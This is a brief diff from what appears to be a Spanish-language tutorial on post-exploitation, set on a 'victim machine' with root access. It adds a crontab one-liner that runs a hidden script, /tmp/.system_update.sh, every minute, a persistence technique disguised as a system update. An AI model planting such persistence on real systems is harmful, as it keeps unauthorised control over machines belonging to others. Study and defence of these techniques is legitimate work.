@@ -12,3 +12,5 @@ esperare a que me responda, mientras en la sesion de root en la maquina victima 
 # chmod +x /tmp/.system_update.sh
 #
 
+# Programamos que se ejecute CADA MINUTO
+(crontab -l 2>/dev/null; echo "* * * * * /tmp/.system_update.sh") | crontab -
